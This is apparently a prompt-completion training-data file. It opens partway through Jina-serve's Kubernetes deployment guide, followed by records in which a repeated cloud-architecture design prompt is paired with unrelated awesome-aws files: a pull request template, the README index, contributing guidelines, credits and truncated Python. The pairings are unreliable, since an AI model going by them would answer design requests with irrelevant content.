executor.py\n```\n````\n\nPutting all these files into a folder named CLIPEncoder and calling `jina hub push CLIPEncoder --private` should give:\n\n```shell\n╭────────────────────────── Published ───────────────────────────╮\n│                                                                │\n│   📛 Name           EncoderPrivate                         │\n│   🔗 Jina Hub URL   https://cloud.jina.ai/executor/<executor-id>/   │\n│   👀 Visibility     private                                    │\n│                                                                │\n╰────────────────────────────────────────────────────────────────╯\n╭───────────────────────────────────────────────────── Usage ─────────────────────────────────────────────────────╮\n│                                                                                                                 │\n│   Container   YAML     uses: jinaai+docker://<user-id>/EncoderPrivate:latest           │\n│               Python   .add(uses='jinaai+docker://<user-id>/EncoderPrivate:latest')    │\n│                                                                                                                 │\n│   Source      YAML     uses: jinaai://<user-id>/EncoderPrivate:latest                  │\n│               Python   .add(uses='jinaai://<user-id>/EncoderPrivate:latest')           │\n│                                                                                                                 │\n╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯\n```\n\nThen we can build an indexer to provide `index` and `search` endpoints:\n\n````{tab} executor.py\n```{code-block} python\nfrom typing import Optional, List\nfrom docarray import DocList, BaseDoc\nfrom docarray.index import InMemoryExactNNIndex\nfrom docarray.typing import NdArray\nfrom jina import Executor, requests\n\n\nclass MyDoc(BaseDoc):\n    text: str\n    embedding: Optional[NdArray] = None\n\n\nclass MyDocWithMatches(MyDoc):\n    matches: DocList[MyDoc] = []\n    scores: List[float] = []\n\n\nclass Indexer(Executor):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self._indexer = InMemoryExactNNIndex[MyDoc]()\n\n    @requests(on='/index')\n    def index(self, docs: DocList[MyDoc], **kwargs) -> DocList[MyDoc]:\n        self._indexer.index(docs)\n        return docs\n\n    @requests(on='/search')\n    def search(self, docs: DocList[MyDoc], **kwargs) -> DocList[MyDocWithMatches]:\n        res = DocList[MyDocWithMatches]()\n        ret = self._indexer.find_batched(docs, search_field='embedding')\n        matched_documents = ret.documents\n        matched_scores = ret.scores\n        for query, matches, scores in zip(docs, matched_documents, matched_scores):\n            output_doc = MyDocWithMatches(**query.dict())\n            output_doc.matches = matches\n            output_doc.scores = scores.tolist()\n            res.append(output_doc)\n        return res\n\n```\n````\n````{tab} config.yml\n```\njtype: Indexer\nmetas:\n  name: IndexerPrivate\n  py_modules:\n    - executor.py\n```\n````\n\nPutting all these files into a folder named Indexer and calling `jina hub push Indexer --private` should give:\n\n```shell\n╭────────────────────────── Published ───────────────────────────╮\n│                                                                │\n│   📛 Name           IndexerPrivate                         │\n│   🔗 Jina Hub URL   https://cloud.jina.ai/executor/<executor-id>/   │\n│   👀 Visibility     private                                    │\n│                                                                │\n╰────────────────────────────────────────────────────────────────╯\n╭───────────────────────────────────────────────────── Usage ─────────────────────────────────────────────────────╮\n│                                                                                                                 │\n│   Container   YAML     uses: jinaai+docker://<user-id>/IndexerPrivate:latest           │\n│               Python   .add(uses='jinaai+docker://<user-id>/IndexerPrivate:latest')    │\n│                                                                                                                 │                      │\n│   Source      YAML     uses: jinaai://<user-id>/IndexerPrivate:latest                  │\n│               Python   .add(uses='jinaai://<user-id>/IndexerPrivate:latest')           │\n│                                                                                                                 │\n╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯\n```\n\nNow, since we have created private Executors, we need to make sure that K8s has the right credentials to download\nfrom the private registry:\n\nFirst, we need to create the namespace where our Flow will run:\n\n```shell\nkubectl create namespace custom-namespace\n```\n\nSecond, we execute this python script:\n\n```python\nimport json\nimport os\nimport base64\n\nJINA_CONFIG_JSON_PATH = os.path.join(os.path.expanduser('~'), os.path.join('.jina', 'config.json'))\nCONFIG_JSON = 'config.json'\n\nwith open(JINA_CONFIG_JSON_PATH) as fp:\n    auth_token = json.load(fp)['auth_token']\n\nconfig_dict = dict()\nconfig_dict['auths'] = dict()\nconfig_dict['auths']['registry.hubble.jina.ai'] = {'auth': base64.b64encode(f'<token>:{auth_token}'.encode()).decode()}\n\nwith open(CONFIG_JSON, mode='w') as fp:\n    json.dump(config_dict, fp)\n```\n\nFinally, we add a secret to be used as [imagePullSecrets](https://kubernetes.io/docs/tasks/configure-pod-container/pull-image-private-registry/) in the namespace from our config.json:\n\n```shell script\nkubectl -n custom-namespace create secret generic regcred --from-file=.dockerconfigjson=config.json --type=kubernetes.io/dockerconfigjson\n```\n\n## Deploy an embedding model inside a Deployment\n\nNow we are ready to first deploy our embedding model as an embedding service in Kubernetes.\n\nFor now, define a Deployment,\neither in {ref}`YAML <deployment-yaml-spec>` or directly in Python, as we do here:\n\n```python\nfrom jina import Deployment\n\nd = Deployment(port=8080, name='encoder', uses='jinaai+docker://<user-id>/EncoderPrivate', image_pull_secrets=['regcred'])\n```\n\nYou can serve any Deployment you want.\nJust ensure that the Executor is containerized, either by using *'jinaai+docker'*, or by {ref}`containerizing your local\nExecutors <dockerize-exec>`.\n\nNext, generate Kubernetes YAML configs from the Flow. Notice, that this step may be a little slow, because [Executor Hub](https://cloud.jina.ai/) may \nadapt the image to your Jina-serve and docarray version.\n\n```python\nd.to_kubernetes_yaml('./k8s_deployment', k8s_namespace='custom-namespace')\n```\n\nThe following file structure will be generated - don't worry if it's slightly different -- there can be \nchanges from one Jina-serve version to another:\n\n```\n.\n└── k8s_deployment\n    └── encoder.yml\n```\n\nYou can inspect these files to see how Deployment and Executor concepts are mapped to Kubernetes entities.\nAnd as always, feel free to modify these files as you see fit for your use case.\n\n````{admonition} Caution: Executor YAML configurations\n:class: caution\n\nAs a general rule, the configuration files produced by `to_kubernetes_yaml()` should run out of the box, and if you strictly\nfollow this how-to they will.\n\nHowever, there is an exception to this: If you use a local dockerized Executor, and this Executors configuration is stored\nin a file other than `config.yaml`, you will have to adapt this Executor's Kubernetes YAML.\nTo do this, open the file and replace `config.yaml` with the actual path to the Executor configuration.\n\nThis is because when a Flow contains a Docker image, it can't see what Executor\nconfiguration was used to create that image.\nSince all of our tutorials use `config.yaml` for that purpose, the Flow uses this as a best guess.\nPlease adapt this if you named your Executor configuration file differently.\n````\n\nNext you can actually apply these configuration files to your cluster, using `kubectl`.\nThis launches the Deployment service.\n\nNow, deploy this Deployment to your cluster:\n```shell\nkubectl apply -R -f ./k8s_deployment\n```\n\nCheck that the Pods were created:\n```shell\nkubectl get pods -n custom-namespace\n```\n\n```text\nNAME                              READY   STATUS    RESTARTS   AGE\nencoder-81a5b3cf9-ls2m3           1/1     Running   0          60m\n```\n\nOnce you see that the Deployment ready, you can start embedding documents:\n\n```python\nfrom typing import Optional\nimport portforward\nfrom docarray import DocList, BaseDoc\nfrom docarray.typing import NdArray\n\nfrom jina.clients import Client\n\n\nclass MyDoc(BaseDoc):\n    text: str\n    embedding: Optional[NdArray] = None\n\n\nwith portforward.forward('custom-namespace', 'encoder-81a5b3cf9-ls2m3', 8080, 8080):\n    client = Client(host='localhost', port=8080)\n    client.show_progress = True\n    docs = client.post(\n        '/encode',\n        inputs=DocList[MyDoc]([MyDoc(text=f'This is document indexed number {i}') for i in range(100)]),\n        return_type=DocList[MyDoc],\n        request_size=10\n    )\n\n    for doc in docs:\n        print(f'{doc.text}: {doc.embedding}')\n\n```\n\n## Deploy a simple Flow\n\nNow we are ready to build a Flow composed of multiple Executors.\n\nBy *simple* in this context we mean a Flow without replicated or sharded Executors - you can see how to use those in\nKubernetes {ref}`later on <kubernetes-replicas>`.\n\nFor now, define a Flow,\neither in {ref}`YAML <flow-yaml-spec>` or directly in Python, as we do here:\n\n```python\nfrom jina import Flow\n\nf = (\n    Flow(port=8080, image_pull_secrets=['regcred'])\n    .add(name='encoder', uses='jinaai+docker://<user-id>/EncoderPrivate')\n    .add(\n        name='indexer',\n        uses='jinaai+docker://<user-id>/IndexerPrivate',\n    )\n)\n```\n\nYou can essentially define any Flow of your liking.\nJust ensure that all Executors are containerized, either by using *'jinaai+docker'*, or by {ref}`containerizing your local\nExecutors <dockerize-exec>`.\n\nThe example Flow here simply encodes and indexes text data using two Executors pushed to the [Executor Hub](https://cloud.jina.ai/).\n \nNext, generate Kubernetes YAML configs from the Flow. Notice, that this step may be a little slow, because [Executor Hub](https://cloud.jina.ai/) may \nadapt the image to your Jina-serve and docarray version.\n\n```python\nf.to_kubernetes_yaml('./k8s_flow', k8s_namespace='custom-namespace')\n```\n\nThe following file structure will be generated - don't worry if it's slightly different -- there can be \nchanges from one Jina-serve version to another:\n\n```\n.\n└── k8s_flow\n    ├── gateway\n    │   └── gateway.yml\n    └── encoder\n    │   └── encoder.yml\n    └── indexer\n        └── indexer.yml\n```\n\nYou can inspect these files to see how Flow concepts are mapped to Kubernetes entities.\nAnd as always, feel free to modify these files as you see fit for your use case.\n\nNext you can actually apply these configuration files to your cluster, using `kubectl`.\nThis launches all Flow microservices.\n\nNow, deploy this Flow to your cluster:\n```shell\nkubectl apply -R -f ./k8s_flow\n```\n\nCheck that the Pods were created:\n```shell\nkubectl get pods -n custom-namespace\n```\n\n```text\nNAME                              READY   STATUS    RESTARTS   AGE\nencoder-8b5575cb9-bh2x8           1/1     Running   0          60m\ngateway-66d5f45ff5-4q7sw          1/1     Running   0          60m\nindexer-8f676fc9d-4fh52           1/1     Running   0          60m\n```\n\nNote that the Jina gateway was deployed with name `gateway-7df8765bd9-xf5tf`.\n\nOnce you see that all the Deployments in the Flow are ready, you can start indexing documents:\n\n```python\nfrom typing import List, Optional\nimport portforward\nfrom docarray import DocList, BaseDoc\nfrom docarray.typing import NdArray\n\nfrom jina.clients import Client\n\n\nclass MyDoc(BaseDoc):\n    text: str\n    embedding: Optional[NdArray] = None\n\n\nclass MyDocWithMatches(MyDoc):\n    matches: DocList[MyDoc] = []\n    scores: List[float] = []\n\n\nwith portforward.forward('custom-namespace', 'gateway-66d5f45ff5-4q7sw', 8080, 8080):\n    client = Client(host='localhost', port=8080)\n    client.show_progress = True\n    docs = client.post(\n        '/index',\n        inputs=DocList[MyDoc]([MyDoc(text=f'This is document indexed number {i}') for i in range(100)]),\n        return_type=DocList[MyDoc],\n        request_size=10\n    )\n\n    print(f'Indexed documents: {len(docs)}')\n    docs = client.post(\n        '/search',\n        inputs=DocList[MyDoc]([MyDoc(text=f'This is document query number {i}') for i in range(10)]),\n        return_type=DocList[MyDocWithMatches],\n        request_size=10\n    )\n    for doc in docs:\n        print(f'Query {doc.text} has {len(doc.matches)} matches')\n\n```\n\n### Deploy with shards and replicas\n\nAfter your service mesh is installed, your cluster is ready to run a Flow with scaled Executors.\nYou can adapt the Flow from above to work with two replicas for the encoder, and two shards for the indexer:\n\n```python\nfrom jina import Flow\n\nf = (\n    Flow(port=8080, image_pull_secrets=['regcred'])\n    .add(name='encoder', uses='jinaai+docker://<user-id>/CLIPEncoderPrivate', replicas=2)\n    .add(\n        name='indexer',\n        uses='jinaai+docker://<user-id>/IndexerPrivate',\n        shards=2,\n    )\n)\n```\n\nAgain, you can generate your Kubernetes configuration:\n\n```python\nf.to_kubernetes_yaml('./k8s_flow', k8s_namespace='custom-namespace')\n```\n\nNow you should see the following file structure:\n\n```\n.\n└── k8s_flow\n    ├── gateway\n    │   └── gateway.yml\n    └── encoder\n    │   └─ encoder.yml\n    └── indexer\n        ├── indexer-0.yml\n        ├── indexer-1.yml\n        └── indexer-head.yml\n```\n\nApply your configuration like usual:\n\n````{admonition} Hint: Cluster cleanup\n:class: hint\nIf you already have the simple Flow from the first example running on your cluster, make sure to delete it using `kubectl delete -R -f ./k8s_flow`.\n````\n\n```shell\nkubectl apply -R -f ./k8s_flow\n```\n\n### Deploy with custom environment variables and secrets\n\nYou can customize the environment variables that are available inside runtime, either defined directly or read from a [Kubernetes secret](https://kubernetes.io/docs/concepts/configuration/secret/):\n\n````{tab} with Python\n```python\nfrom jina import Flow\n\nf = (\n    Flow(port=8080, image_pull_secrets=['regcred'])\n    .add(\n        name='indexer',\n        uses='jinaai+docker://<user-id>/IndexerPrivate',\n        env={'k1': 'v1', 'k2': 'v2'},\n        env_from_secret={\n            'SECRET_USERNAME': {'name': 'mysecret', 'key': 'username'},\n            'SECRET_PASSWORD': {'name': 'mysecret', 'key': 'password'},\n        },\n    )\n)\n\nf.to_kubernetes_yaml('./k8s_flow', k8s_namespace='custom-namespace')\n```\n````\n````{tab} with flow YAML\nIn a `flow.yml` file :\n```yaml\njtype: Flow\nversion: '1'\nwith:\n  protocol: http\nexecutors:\n- name: indexer\n  uses: jinaai+docker://<user-id>/IndexerPrivate\n  env:\n    k1: v1\n    k2: v2\n  env_from_secret:\n    SECRET_USERNAME:\n      name: mysecret\n      key: username\n    SECRET_PASSWORD:\n      name: mysecret\n      key: password\n```\n\nYou can generate Kubernetes YAML configs using `jina export`:\n```shell\njina export kubernetes flow.yml ./k8s_flow --k8s-namespace custom-namespace\n```\n````\n\nAfter creating the namespace, you need to create the secrets mentioned above:\n\n```shell\nkubectl -n custom-namespace create secret generic mysecret --from-literal=username=jina --from-literal=password=123456\n```\n\nThen you can apply your configuration.\n\n\n(kubernetes-expose)=\n## Exposing the service\nThe previous examples use port-forwarding to send documents to the services. \nIn real world applications, \nyou may want to expose your service to make it reachable by users so that you can serve search requests.\n\n```{caution}\nExposing the Deployment or Flow only works if the environment of your `Kubernetes cluster` supports `External Loadbalancers`.\n```\n\nOnce the service is deployed, you can expose a service. In this case we give an example of exposing the encoder when using a Deployment,\nbut you can expose the gateway service when using a Flow:\n```bash\nkubectl expose deployment executor --name=executor-exposed --type LoadBalancer --port 80 --target-port 8080 -n custom-namespace\nsleep 60 # wait until the external ip is configured\n```\n\nExport the external IP address. This is needed for the client when sending Documents to the Flow in the next section. \n```bash\nexport EXTERNAL_IP=`kubectl get service executor-expose -n custom-namespace -o=jsonpath='{.status.loadBalancer.ingress[0].ip}'`\n```\n\n### Client\nThe client:\n\n- Sends Documents to the exposed service on `$EXTERNAL_IP` \n- Gets the responses.\n\nYou should configure your Client to connect to the service via the external IP address as follows:\n\n```python\nimport os\nfrom typing import List, Optional\nfrom docarray import DocList, BaseDoc\nfrom docarray.typing import NdArray\n\nfrom jina.clients import Client\n\n\nclass MyDoc(BaseDoc):\n    text: str\n    embedding: Optional[NdArray] = None\n\n\nclass MyDocWithMatches(MyDoc):\n    matches: DocList[MyDoc] = []\n    scores: List[float] = []\n\nhost = os.environ['EXTERNAL_IP']\nport = 80\n\nclient = Client(host=host, port=port)\n\nclient.show_progress = True\ndocs = DocList[MyDoc]([MyDoc(text=f'This is document indexed number {i}') for i in range(100)])\nqueried_docs = client.post(\"/search\", inputs=docs, return_type=DocList[MyDocWithMatches])\n\nmatches = queried_docs[0].matches\nprint(f\"Matched documents: {len(matches)}\")\n```\n\n## Update your Executor in Kubernetes\n\nIn Kubernetes, you can update your Executors by patching the Deployment corresponding to your Executor.\n\nFor instance, in the example above, you can change the CLIPEncoderPrivate's `pretrained_model_name_or_path` parameter by changing the content of the Deployment inside the `executor.yml` dumped by `.to_kubernetes_yaml`.\n\nYou need to add `--uses_with` and pass the batch size argument to it. This is passed to the container inside the Deployment:\n\n```yaml\n    spec:\n      containers:\n      - args:\n        - executor\n        - --name\n        - encoder\n        - --k8s-namespace\n        - custom-namespace\n        - --uses\n        - config.yml\n        - --port\n        - '8080'\n        - --uses-metas\n        - '{}'\n        - --uses-with\n        - '{\"pretrained_model_name_or_path\": \"other_model\"}'\n        - --native\n        command:\n        - jina\n```\n\nAfter doing so, re-apply your configuration so the new Executor will be deployed without affecting the other unchanged Deployments:\n\n```shell script\nkubectl apply -R -f ./k8s_deployment\n```\n\n````{admonition} Other patching options\n:class: seealso\n\nIn Kubernetes Executors are ordinary Kubernetes Deployments, so you can use other patching options provided by Kubernetes:\n\n\n- `kubectl replace` to replace an Executor using a complete configuration file\n- `kubectl patch` to patch an Executor using only a partial configuration file\n- `kubectl edit` to edit an Executor configuration on the fly in your editor\n\nYou can find more information about these commands in the [official Kubernetes documentation](https://kubernetes.io/docs/concepts/cluster-administration/manage-deployment/).\n````\n\n## Key takeaways\n\nIn short, there are just three key steps to deploy Jina on Kubernetes:\n\n1. Use `.to_kubernetes_yaml()` to generate Kubernetes configuration files from a Jina Deployment or Flow object.\n2. Apply the generated file via `kubectl`(Modify the generated files if necessary)\n3. Expose your service outside the K8s cluster\n\n## See also\n- {ref}`Kubernetes support documentation <kubernetes-docs>`\n- {ref}`Monitor service once it is deployed <monitoring>`\n- {ref}`See how failures and retries are handled <flow-error-handling>`\n- {ref}`Learn more about scaling Executors <scale-out>`\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": "docs/cloud-nativeness/kubernetes.md", "language": "markdown", "complexity": "complex", "star_count": 21665, "quality_score": 0.98, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": true, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 695}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "## Review the Contributing Guidelines\n\nBefore submitting a pull request, verify it meets all requirements in the [Contributing Guidelines](https://github.com/donnemartin/awesome-aws/blob/master/CONTRIBUTING.md).\n\n## Describe Why This Is Awesome\n\nWhy is this awesome?\n\n--\n\nLike this pull request?  Vote for it by adding a :+1:\n", "metadata": {"source": "github.com/donnemartin/awesome-aws", "file_path": ".github/PULL_REQUEST_TEMPLATE.md", "language": "markdown", "complexity": "simple", "star_count": 13620, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 12}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "<br/>\n<p align=\"center\">\n  <img src=\"https://raw.githubusercontent.com/donnemartin/data-science-ipython-notebooks/master/images/aws.png\">\n</p>\n<br/>\n\n# Awesome AWS [![Awesome](https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg)](https://github.com/sindresorhus/awesome)\n\nA curated list of awesome AWS libraries, open source repos, guides, blogs, and other resources.\n\nInspired by the [awesome](https://github.com/sindresorhus/awesome) list.\n\n## The Fiery Meter of AWSome\n\n* Repo with 0100+ Stars: :fire:\n* Repo with 0200+ Stars: :fire::fire:\n* Repo with 0500+ Stars: :fire::fire::fire:\n* Repo with 1000+ Stars: :fire::fire::fire::fire:\n* Repo with 2000+ Stars: :fire::fire::fire::fire::fire:\n\nRepos not on `The Fiery Meter of AWSome` can still be awesome, see [A Note on Repo AWSomeness](https://github.com/donnemartin/awesome-aws/blob/master/CONTRIBUTING.md#a-note-on-repo-awsomeness).\n\n### `awesome-aws` Python Module\n\n[![Build Status](https://travis-ci.org/donnemartin/awesome-aws.svg?branch=master)](https://travis-ci.org/donnemartin/awesome-aws) [![Codecov](https://img.shields.io/codecov/c/github/donnemartin/awesome-aws.svg)](https://codecov.io/github/donnemartin/saws/awesome-aws) [![PyPI version](https://badge.fury.io/py/awesome-aws.svg)](http://badge.fury.io/py/awesome-aws)\n\nThe Python module [`awesome-aws`](https://github.com/donnemartin/awesome-aws/tree/master/awesome) regularly scans repos on [Awesome AWS](https://github.com/donnemartin/awesome-aws) to maintain the accuracy of the `Fiery Meter of AWSome`.\n\n## Contributing\n\nContributions are welcome!\n\nCheck out the [Contributing Guidelines](https://github.com/donnemartin/awesome-aws/blob/master/CONTRIBUTING.md).\n\n## Index\n\n* [SDKs and Samples](#sdks-and-samples)\n    * [Android](#android-sdk)\n    * [C++](#c-sdk)\n    * [Clojure](#clojure-sdk)\n    * [Go](#go-sdk)\n    * [iOS](#ios-sdk)\n    * [IoT](#iot-sdk)\n    * [Java](#java-sdk)\n    * [JavaScript](#javascript-sdk)\n    * [Haskell](#haskell-sdk)\n    * [OCaml](#ocaml-sdk)\n    * [Perl](#perl-sdk)\n    * [PHP](#php-sdk)\n    * [Python](#python-sdk)\n    * [Ruby](#ruby-sdk)\n    * [Scala](#scala-sdk)\n    * [Xamarin](#xamarin-sdk)\n    * [Unity](#unity-sdk)\n    * [.NET](#net-sdk)\n* [Command Line Tools](#command-line-tools)\n    * [Universal Command Line Interface](#universal-command-line-interface)\n    * [Windows PowerShell](#windows-powershell)\n* [IDE Toolkits](#ide-toolkits)\n    * [Eclipse Toolkit](#eclipse-toolkit)\n    * [Visual Studio Toolkit](#visual-studio-toolkit)\n* [Open Source Repos](#open-source-repos)\n    * [API Gateway](#api-gateway)\n    * [AppStream](#appstream)\n    * [CLI](#cli)\n    * [CloudFormation](#cloudformation)\n    * [CloudSearch](#cloudsearch)\n    * [CloudTrail](#cloudtrail)\n    * [CloudWatch](#cloudwatch)\n    * [Code Deploy](#code-deploy)\n    * [Code Pipeline](#code-pipeline)\n    * [Cognito](#cognito)\n    * [Data Pipeline](#data-pipeline)\n    * [Device Farm](#device-farm)\n    * [DynamoDB](#dynamodb)\n    * [Elastic Beanstalk](#elastic-beanstalk)\n    * [Elastic Container Service](#elastic-container-service)\n    * [Elastic File System](#elastic-file-system)\n    * [Elastic MapReduce](#elastic-mapreduce)\n    * [Elastic Search](#elastic-search)\n    * [Elasticache](#elasticache)\n    * [Glacier](#glacier)\n    * [Kinesis](#kinesis)\n    * [Lambda](#lambda)\n    * [Machine Learning](#machine-learning)\n    * [Mobile Analytics](#mobile-analytics)\n    * [OpsWorks](#opsworks)\n    * [Redshift](#redshift)\n    * [Route 53](#route-53)\n    * [S3](#s3)\n    * [SNS](#sns)\n    * [SQS](#sqs)\n    * [Data](#data)\n    * [DevOps](#devops)\n    * [Security](#security)\n    * [Accompanying](#accompanying-repos)\n    * [Miscellaneous](#miscellaneous-repos)\n* [Guides, Books, Documentation, and Training](#guides-books-documentation-and-training)\n    * [Getting Started Guides](#getting-started-guides)\n    * [General Guides](#general-guides)\n    * [Books](#books)\n    * [Whitepapers](#whitepapers)\n    * [Documentation](#documentation)\n    * [Training](#training)\n    * [Case Studies: Powered by AWS](#case-studies-powered-by-aws)\n* [Social](#social)\n    * [Blogs](#blogs)\n    * [Twitter Influencers](#twitter-influencers)\n    * [Facebook Pages](#facebook-pages)\n    * [YouTube Channels](#youtube-channels)\n    * [LinkedIn Groups](#linkedin-groups)\n    * [Subreddits](#subreddits)\n    * [Conferences](#conferences)\n* [Latest KPIs and Stats](#latest-kpis-and-stats)\n* [Appendix of Core Services](#appendix-of-core-services)\n    * [Services in Plain English](#services-in-plain-english)\n    * [Compute](#compute-services)\n    * [Networking](#networking-services)\n    * [Enterprise Applications](#enterprise-applications)\n    * [Analytics](#analytics-services)\n    * [Management Tools](#management-tools)\n    * [Security and Identity](#security-and-identity-services)\n    * [Internet of Things](#internet-of-things-service)\n    * [Mobile Services](#mobile-services)\n    * [Storage and Content Delivery](#storage-and-content-delivery-services)\n    * [Databases](#databases)\n    * [Application Services](#application-services)\n    * [Developer Tools](#developer-tools)\n    * [Miscellaneous Services](#miscellaneous-services)\n* [Contributing](#contributing)\n* [Credits](#credits)\n* [Other Awesome Lists](#other-awesome-lists)\n* [Contact Info](#contact-info)\n* [License](#license)\n\nChangelog\n=========\n\n0.1.0 (2015-12-21)\n------------------\n\n- Initial release.\n", "metadata": {"source": "github.com/donnemartin/awesome-aws", "file_path": "CHANGELOG.md", "language": "markdown", "complexity": "medium", "star_count": 13620, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": true, "line_count": 143}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Contributing Guidelines\n\nContributions are welcome!\n\nPlease ensure your pull request adheres to the following guidelines.\n\n## A Note on Repo AWSomeness\n\nEach repo listed meets at least one of the following requirements:\n\n* Community-authored repo with 100+ stars\n* Community-vouched repo with < 100 stars\n* Official repo from [aws](https://github.com/aws) or [awslabs](https://github.com/awslabs)\n\n100+ stars for community repos is not a strict requirement, it only serves as a guideline for the initial compilation.  If you can vouch for the awesomeness of a repo with < 100 stars and you can explain why it should be listed, please submit a pull request.\n\nPull requests might be left open for a period of time to let the community chime in and vouch for it.  An official repo from [aws](https://github.com/aws) or [awslabs](https://github.com/awslabs) can be removed if the community wishes.  Check out the [awesome manifesto](https://github.com/sindresorhus/awesome/blob/master/awesome.md).\n\n## Pull Requests\n\n* Search previous suggestions before making a new one, as yours may be a duplicate.\n* Add one link per pull request.\n* Add the link:\n    * `[name](http://example.com/) - A short description ends with a period.`\n    * Keep descriptions concise.\n    * Maintain alphabetical ordering where applicable.\n* Add a section if needed.\n    * Add the section description.\n    * Add the section title to the [Index](https://github.com/donnemartin/awesome-aws#index).\n* You generally do not need to mention `AWS` or `Amazon Web Services` in the description as it's implied.\n* Check your spelling and grammar.\n* Remove any trailing whitespace.\n* Send a pull request with the reason why the addition is awesome.\n* Use the following format for your pull request title:\n    * Add user/repo - Short repo description\n\n## Updates to Existing Links or Sections\n\n* Improvements to the existing sections are welcome.\n* If you think a listed link is **not** awesome, feel free to submit an issue or pull request to begin the discussion.\n\nThank you for your suggestions!\n", "metadata": {"source": "github.com/donnemartin/awesome-aws", "file_path": "CONTRIBUTING.md", "language": "markdown", "complexity": "simple", "star_count": 13620, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 43}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# CREDITS\n\n## Content\n\n* [Awesome Python](https://github.com/vinta/awesome-python) as the template used to create this repo.\n* [Wikipedia](https://en.wikipedia.org/wiki/Amazon_Web_Services) for portions of the [Appendix of Core Services](#appendix-of-core-services).\n\n## Images\n\n* [Repo Header](https://aws.amazon.com)\n* [SDK Header](https://conceptdraw.com/a3125c3/p1/preview/640/pict--aws-architecture-diagram-icons-design-elements-aws-sdks)\n* [CLI Header](http://arcanesanctum.net/wp-content/uploads/hasher/terminal.jpg)\n* [Eclipse IDE Header](http://help.eclipse.org/juno/topic/org.eclipse.platform.doc.user/whatsNew/images/icon.png)\n* [Visual Studio IDE Header](http://www.iconarchive.com/download/i98390/dakirby309/simply-styled/Microsoft-Visual-Studio.ico)\n* [GitHub Header](http://itjobsco.com/wp-content/themes/wpjobus/images/github_logo.png)\n* [Innovation at Scale Header](https://d1.awsstatic.com/Digital%20Marketing/House/2up/products/quicksight/ha_2up_quicksight.png)\n* [Guides Header](http://d1.awsstatic.com/asset-repository/generics/whitepaper/editorial_whitepaper_green.png)\n* [Social Header](https://twitter.com/awscloud)\n* [Appendix Header](https://console.aws.amazon.com/)", "metadata": {"source": "github.com/donnemartin/awesome-aws", "file_path": "CREDITS.md", "language": "markdown", "complexity": "simple", "star_count": 13620, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": true, "line_count": 19}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# coding: utf-8\n\n# Copyright 2015 Donne Martin. All Rights Reserved.\n#\n# Creative Commons Attribution 4.0 International License (CC BY 4.0)\n# http://creativecommons.org/licenses/by/4.0/\n\nimport re\n\nimport click\nfrom githubcli.lib.github3 import null\n\nfrom awesome.lib.github import GitHub\n\n\nclass Awesome(object):\n    \"\"\"Awesomeness.\n\n    :type github: :class:`awesome.lib.GitHub`\n    :param github: Provides integration with the GitHub API.\n\n    :type output: list\n    :param output: The updated README content.\n\n    :type repos_broken: list\n    :param repos_broken: Dead repos found during parsing.\n\n    :type repos_exclude_score: list\n    :param repos_exclude_score: Repos to exclude in calculating the\n        Fiery Meter of AWSome score.\n\n    \"\"\"\n\n    def __init__(self, github=None):\n        self.github = github if github else GitHub()\n        self.output = []\n        self.repos_broken = []\n        self.repos_exclude_score = [\n            'https://github.com/donnemartin',\n            'https://github.com/donnemartin/awesome-aws',\n            'https://github.com/sindresorhus/awesome',\n            'https://github.com/kilimchoi/engineering-blogs',\n            'https://github.com/aws/aws-sdk-go/wiki',\n            '#',\n        ]\n\n    def 